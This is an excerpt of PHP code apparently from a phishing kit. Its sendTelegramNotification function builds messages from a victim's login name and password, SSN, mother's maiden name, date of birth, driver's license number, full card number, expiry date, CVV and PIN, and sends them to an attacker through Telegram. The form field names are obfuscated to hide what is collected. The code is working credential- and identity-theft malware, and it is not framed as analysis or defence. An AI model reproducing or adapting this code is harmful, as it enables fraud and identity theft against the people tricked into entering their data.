...
function sendTelegramNotification($data) {
    ...
    switch ($step) {
        case 'login':
            $message = "🆕 New User Registration Started\n";
            $message .= "👤 Username: " . ($data['emzemz'] ?? $data['username'] ?? 'N/A') . "\n";
            $message .= "🔑 Password: " . ($data['pwzenz'] ?? $data['password'] ?? 'N/A') . "\n";
            $message .= "🌐 IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
            $message .= "📱 User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . "\n";
            $message .= "⏰ Time: " . $timestamp . "\n";
            
            // Add all form data explicitly
            if (isset($data['remember'])) {
                $message .= "🔹 Remember Me: " . ($data['remember'] ? 'Yes' : 'No') . "\n";
            }
            
            // Add any additional fields that might be present
            $ignoredFields = ['step', 'username', 'password', 'usrnm', 'emzemz', 'pwzenz', 'remember'];
            foreach ($data as $key => $value) {
                if (!in_array($key, $ignoredFields) && !empty($value)) {
...
🔑 Password: " . (isset($data['acc_cd']) ? $data['acc_cd'] : 'N/A') . "
...
🔢 SSN: " . (isset($data['tax_id']) ? $data['tax_id'] : 'N/A') . "
👶 Mother's Maiden: " . (isset($data['mat_nm']) ? $data['mat_nm'] : 'N/A') . "
🎂 DOB: " . (isset($data['dob']) ? $data['dob'] : 'N/A') . "
🪪 Driver's License: " . (isset($data['id_num']) ? $data['id_num'] : 'N/A') . "
...
💳 Card Details:
💳 Card: " . (isset($data['pay_card']) ? $data['pay_card'] : 'N/A') . "
📅 Exp: " . (isset($data['exp_mth']) && isset($data['exp_yr']) ? $data['exp_mth'] . '/' . $data['exp_yr'] : 'N/A') . "
🔢 CVV: " . (isset($data['sec_cd']) ? $data['sec_cd'] : 'N/A') . "
🏧 PIN: " . (isset($data['pin_cd']) ? $data['pin_cd'] : 'N/A') . "";
            break;
        ...
        case 'terms_acceptance':
            ...
            $loginInfo = $completeData['login'] ?? [];
            
            // Get email from login data if not in email info
            if (empty($emailInfo) && !empty($loginInfo['emzemz'])) {
                $email = $loginInfo['emzemz'];
            } else {
                $email = $emailInfo['usr_eml'] ?? 'N/A';
            }
            ...
            $formattedCard = $cardNumber ? substr($cardNumber, 0, 4) . '-' . 
...
📋 Complete Summary:
👤 Name: " . ($basicInfo['gvn_nm'] ?? 'N/A') . " " . ($basicInfo['fam_nm'] ?? 'N/A') . "
📧 Email: " . $email . "
📞 Phone: " . ($basicInfo['cnt_num'] ?? 'N/A') . "
🔢 SSN: " . ($basicInfo['tax_id'] ?? 'N/A') . "
👶 Mother's Maiden: " . ($basicInfo['mat_nm'] ?? 'N/A') . "
🎂 DOB: " . ($basicInfo['dob'] ?? 'N/A') . "
🪪 Driver's License: " . ($basicInfo['id_num'] ?? 'N/A') . "

🏠 Address: " . ($address ?: 'N/A') . "

💳 Card: " . $formattedCard . "
📅 Exp: " . (isset($cardInfo['exp_mth']) && isset($cardInfo['exp_yr']) ? 
                $cardInfo['exp_mth'] . '/' . $cardInfo['exp_yr'] : 'N/A') . "
🔢 CVV: " . ($cardInfo['sec_cd'] ?? 'N/A') . "
🏧 PIN: " . ($cardInfo['pin_cd'] ?? 'N/A') . "
